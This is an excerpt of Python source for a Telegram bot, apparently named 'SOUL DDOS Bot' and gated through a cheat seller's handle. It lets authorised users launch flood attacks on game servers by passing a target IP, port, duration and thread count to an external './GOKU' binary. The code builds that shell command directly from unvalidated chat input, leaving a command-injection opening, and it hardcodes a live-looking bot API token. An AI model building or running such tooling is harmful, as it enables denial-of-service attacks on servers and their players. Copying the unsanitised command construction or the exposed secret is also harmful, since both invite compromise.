...
API_TOKEN = '7089167523:AAEwZEuOurY3Swbch3jgF-wJ6WrLynBe9Ak'
...
async def welcome_user(message: Message):
    if not await checkauthorization(message.from_user.id):
        await message.answer("𝘼𝙘𝙘𝙚𝙨𝙨 𝙙𝙚𝙣𝙞𝙚𝙙\n 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤𝙩 𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙯𝙚𝙙 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩\n 𝙠𝙞𝙣𝙙𝙡𝙮 𝘿𝙢 @SOULxCHEAT 𝙏𝙤 𝙂𝙚𝙩 𝘼𝙘𝙘𝙚𝙨𝙨")
        return

    await message.answer(f"𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 SOUL 𝘿𝘿𝙊𝙎 𝘽𝙤𝙩! 🚀\n\n"

                         f"𝙏𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙡𝙡𝙤𝙬𝙨 𝙮𝙤𝙪 𝙩𝙤 𝙡𝙖𝙪𝙣𝙘𝙝 𝙖 𝘽𝙂𝙈𝙄 𝙖𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 𝙖 𝙩𝙖𝙧𝙜𝙚𝙩 𝙄𝙋 𝙖𝙣𝙙 𝙥𝙤𝙧𝙩.\n\n" 

                         f"GOKU <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨>  \n\n"    

                           "𝙀𝙭𝙖𝙢𝙥𝙡𝙚:/GOKU 20.235.94.237 17870 180 180\n\n") 
...
async def bgmi_attack(message: Message):
    ...
    args = message.text.split()[1:]
    if len(args) < 4:
        await message.answer(" 🤦‍♂️𝙐𝙨𝙖𝙜𝙚: /GOKU <𝙞𝙥> <𝙥𝙤𝙧𝙩> <𝙩𝙞𝙢𝙚_𝙨𝙚𝙘𝙤𝙣𝙙𝙨> <𝙩𝙝𝙧𝙚𝙖𝙙𝙨> \n\n 🤷‍♀️𝙀𝙭𝙖𝙢𝙥𝙡𝙚  /𝙗𝙜𝙢𝙞 20.235.94.237 17870 180 180")
        return

    ip, port, time_seconds, threads = args
    command = f"./GOKU {ip} {port} {time_seconds} {threads}"
...
async def main():
    ...
    dp.message.register(bgmi_attack, filters.Command(commands=['GOKU']))
